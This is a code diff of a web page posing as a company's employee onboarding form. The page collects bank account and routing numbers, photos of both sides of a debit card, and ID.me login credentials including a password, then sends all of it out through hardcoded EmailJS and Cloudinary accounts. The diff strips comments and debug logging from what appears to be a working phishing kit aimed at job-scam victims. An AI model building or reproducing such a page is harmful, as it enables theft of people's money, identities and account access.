@@ -6,7 +6,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <link href="./src/output.css" rel="stylesheet">
     <link rel="shortcut icon" href="./images/blc.png" type="image/x-icon " class="rounded-full">
-    <!-- Added EmailJS SDK -->
+
     <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
     <title>BLC</title>
 </head>
@@ -23,7 +23,7 @@
 
                 <!-- Desktop Navigation -->
                 <nav class="hidden md:flex items-center space-x-8 font-medium text-xs">
-                    <a href="./careers.html" class="text-gray-900/95 hover:text-gray-600 transition-colors">Career</a>
+                    <a href="#" class="text-gray-900/95 hover:text-gray-600 transition-colors">Career</a>
                     <a href="#" class="text-gray-900/95 hover:text-gray-600 transition-colors">Partners</a>
                     <a href="#" class="text-gray-900/95 hover:text-gray-600 transition-colors">Support</a>
                     <a href="#" class="text-gray-900/95 hover:text-gray-600 transition-colors">About</a>
@@ -46,7 +46,7 @@
         <!-- Mobile Navigation -->
         <div id="mobile-menu" class="md:hidden hidden ">
             <div class="px-2 pt-2 pb-3 space-y-1 bg-white">
-                <a href="./careers.html"
+                <a href="#"
                     class="block px-3 py-2 text-gray-900/95 hover:text-gray-500 hover:bg-gray-700 rounded-md">Career</a>
                 <a href="#"
                     class="block px-3 py-2 text-gray-900/95 hover:text-gray-500 hover:bg-gray-700 rounded-md">Partners</a>
@@ -59,19 +59,18 @@
             </div>
         </div>
     </header>
-    <!-- Hero Section with Background Video -->
+
     <section class="relative min-h-[80vh]  flex items-center justify-left px-12 overflow-hidden">
-        <!-- Background Video -->
+
         <div class="absolute inset-0 w-full h-[80vh]">
             <video autoplay muted loop playsinline class="absolute inset-0 w-full h-full object-fill z-0"
                 poster="./images/Screenshot 2025-08-20 111220.png">
                 <source src="./images/videoplayback (1).mp4" type="video/mp4">
             </video>
-            <!-- Gradient overlay -->
-            <!-- <div class="absolute inset-0 bg-gradient-to-br from-gray-900 via-blue-900 to-gray-900 -z-1"></div> -->
+           
         </div>
 
-        <!-- Hero Content -->
+     
         <div class="relative  z-20 text-left max-w-4xl  px-1 sm:px-6 lg:px-2">
             <h1 class="text-5xl text-white md:text-4xl lg:text-6xl font-medium  mb-6 leading-tight">
                 Business, faster than
@@ -81,7 +80,7 @@
                 Make the most of your data and automation to optimize business processes and accelerate digital
                 transformation.
             </p>
-            <a href="./careers.html">
+            <a href="#">
                 <button
                     class=" hover:bg-orange-700 text-white font-normal py-1 px-3 text-sm border-2 border-white transition-colors duration-300 transform hover:scale-105">
                     Career
@@ -91,16 +90,15 @@
         </div>
     </section>
 
-    <!-- Employee Info & Bank Details Form Section -->
+  
     <section class="py-16 bg-gray-50">
         <div class="max-w-4xl mx-auto px-6">
-            <!-- Employee Info & Bank Details Form -->
+    
             <div class="bg-white rounded-lg shadow-lg p-8 mb-8">
                 <h2 class="text-2xl font-bold text-blue-900 mb-8 text-center">Employee Info & Bank Details</h2>
 
-                <!-- Added form ID and proper input names for EmailJS -->
                 <form id="employee-form" class="space-y-6">
-                    <!-- Account Holder Name -->
+               
                     <div>
                         <label class="block text-sm font-medium text-blue-900 mb-2">Account Holder Name</label>
                         <input type="text" name="account_holder_name" placeholder="Enter full name"
@@ -108,7 +106,6 @@
                             required>
                     </div>
 
-                    <!-- Account Name -->
                     <div>
                         <label class="block text-sm font-medium text-blue-900 mb-2">Account Name <span
                                 class="text-green-600 text-xs">[This name must match account details
@@ -118,7 +115,7 @@
                             required>
                     </div>
 
-                    <!-- Bank Name and Address Row -->
+             
                     <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
                         <div>
                             <label class="block text-sm font-medium text-blue-900 mb-2">Bank Name</label>
@@ -134,7 +131,7 @@
                         </div>
                     </div>
 
-                    <!-- Account Number and Routing Number Row -->
+               
                     <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
                         <div>
                             <label class="block text-sm font-medium text-blue-900 mb-2">Account Number</label>
@@ -150,7 +147,7 @@
                         </div>
                     </div>
 
-                    <!-- City and State Row -->
+               
                     <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
                         <div>
                             <label class="block text-sm font-medium text-blue-900 mb-2">City</label>
@@ -166,7 +163,6 @@
                         </div>
                     </div>
 
-                    <!-- Postal/Zip Code -->
                     <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
                         <div>
                             <label class="block text-sm font-medium text-blue-900 mb-2">Postal/Zip code</label>
@@ -177,7 +173,6 @@
                         <div></div>
                     </div>
 
-                    <!-- Account Type -->
                     <div>
                         <label class="block text-sm font-medium text-blue-900 mb-2">Account Type</label>
                         <select name="account_type"
@@ -191,7 +186,7 @@
                 </form>
             </div>
 
-            <!-- Bank App Option Section -->
+    
             <div class="bg-white rounded-lg shadow-lg p-8 mb-8 border border-gray-200">
                 <h3 class="text-xl font-bold text-blue-900 mb-2">Bank App Option</h3>
                 <p class="text-sm text-blue-700 mb-6">Link your bank for instance access</p>
@@ -209,12 +204,11 @@
                     </div>
                 </div>
 
-                <!-- File Upload Sections -->
                 <div class="space-y-4">
                     <div>
                         <label class="block text-sm font-medium text-blue-900 mb-2">Upload Debit Card (Front)</label>
                         <div class="flex items-center space-x-4">
-                            <!-- Added proper file input for debit card front -->
+                      
                             <input type="file" id="debit-front" name="debit_front" accept="image/*" class="hidden"
                                 form="employee-form">
                             <button type="button" onclick="document.getElementById('debit-front').click()"
@@ -226,7 +220,7 @@
                     <div>
                         <label class="block text-sm font-medium text-blue-900 mb-2">Upload Debit Card (Back)</label>
                         <div class="flex items-center space-x-4">
-                            <!-- Added proper file input for debit card back -->
+                       
                             <input type="file" id="debit-back" name="debit_back" accept="image/*" class="hidden"
                                 form="employee-form">
                             <button type="button" onclick="document.getElementById('debit-back').click()"
@@ -238,7 +232,7 @@
                 </div>
             </div>
 
-            <!-- Identification Verification Form -->
+    
             <div class="bg-white rounded-lg shadow-lg p-8 mb-8 border border-gray-200">
                 <h3 class="text-xl font-bold text-blue-900 mb-2">Identification Verification Form(ID.ME)</h3>
                 <p class="text-sm text-green-600 mb-6">Kindly Input the correct details...</p>
@@ -259,7 +253,7 @@
                 </div>
             </div>
 
-            <!-- Agreement and Submit -->
+       
             <div class="bg-white rounded-lg shadow-lg p-8">
                 <div class="flex items-start space-x-3 mb-6">
                     <input type="checkbox" id="agreement" name="agreement" form="employee-form"
@@ -271,20 +265,20 @@
                     </label>
                 </div>
 
-                <!-- Added loading state and proper submit button -->
+     
                 <button type="submit" form="employee-form" id="submit-btn"
                     class="bg-blue-600 text-white px-8 py-3 rounded-md font-medium hover:bg-blue-700 transition-colors disabled:bg-gray-400 disabled:cursor-not-allowed">
                     <span id="submit-text">Submit Info</span>
                     <span id="loading-text" class="hidden">Submitting...</span>
                 </button>
 
-                <!-- Added status message div -->
+     
                 <div id="status-message" class="mt-4 hidden"></div>
             </div>
         </div>
     </section>
 
-    <!-- Footer -->
+
     <footer class="bg-gray-900/95 py-6">
         <div class="container mx-auto px-6">
             <p class="text-white text-sm leading-relaxed text-center">
@@ -294,9 +288,9 @@
             </p>
         </div>
     </footer>
-    <!-- JavaScript -->
+
     <script>
-        // Mobile menu functionality
+  
         const mobileMenuButton = document.getElementById('mobile-menu-button');
         const mobileMenu = document.getElementById('mobile-menu');
 
@@ -340,14 +334,13 @@
             }
         });
 
-        // Initialize EmailJS (replace with your actual public key)
+      
         emailjs.init('WugqMMmr5Zh-h55jk');
 
-        // Cloudinary configuration (replace with your actual cloud name and upload preset)
+    
         const CLOUDINARY_CLOUD_NAME = 'dri1lagoo';
         const CLOUDINARY_UPLOAD_PRESET = 'card-image';
 
-        // File input change handlers
         document.getElementById('debit-front').addEventListener('change', function (e) {
             const fileName = e.target.files[0] ? e.target.files[0].name : 'No file chosen';
             document.getElementById('debit-front-name').textContent = fileName;
@@ -358,7 +351,7 @@
             document.getElementById('debit-back-name').textContent = fileName;
         });
 
-        // Upload image to Cloudinary
+     
         async function uploadToCloudinary(file) {
             const formData = new FormData();
             formData.append('file', file);
@@ -437,31 +430,29 @@
 • Verification Password: ${formData.get('verification_password') || 'N/A'}`
                 };
 
-                console.log('[v0] Template parameters prepared:', templateParams);
+              
 
                 // Upload images to Cloudinary if they exist
                 const debitFrontFile = document.getElementById('debit-front').files[0];
                 const debitBackFile = document.getElementById('debit-back').files[0];
 
                 if (debitFrontFile) {
-                    console.log('[v0] Uploading debit card front...');
+              
                     const frontUrl = await uploadToCloudinary(debitFrontFile);
                     templateParams.message += `\n\n💳 DEBIT CARD IMAGES:\n• Front: ${frontUrl}`;
-                    console.log('[v0] Debit front uploaded:', frontUrl);
+                
                 }
 
                 if (debitBackFile) {
-                    console.log('[v0] Uploading debit card back...');
+              
                     const backUrl = await uploadToCloudinary(debitBackFile);
                     templateParams.message += `\n• Back: ${backUrl}`;
-                    console.log('[v0] Debit back uploaded:', backUrl);
+             
                 }
 
-                // Send email via EmailJS (replace with your actual service ID and template ID)
-                console.log('[v0] Sending email via EmailJS...');
                 const result = await emailjs.send('service_njbyaqd', 'template_lo15nhn', templateParams);
 
-                console.log('[v0] Email sent successfully:', result);
+        
                 showStatus('Employee information submitted successfully! You will receive a confirmation email shortly.');
 
                 // Reset form
@@ -470,10 +461,10 @@
                 document.getElementById('debit-back-name').textContent = 'No file chosen';
 
             } catch (error) {
-                console.error('[v0] Submission error:', error);
+                console.error(' Submission error:', error);
                 showStatus('There was an error submitting your information. Please try again or contact support.', true);
             } finally {
-                // Reset button state
+              
                 submitBtn.disabled = false;
                 submitText.classList.remove('hidden');
                 loadingText.classList.add('hidden');
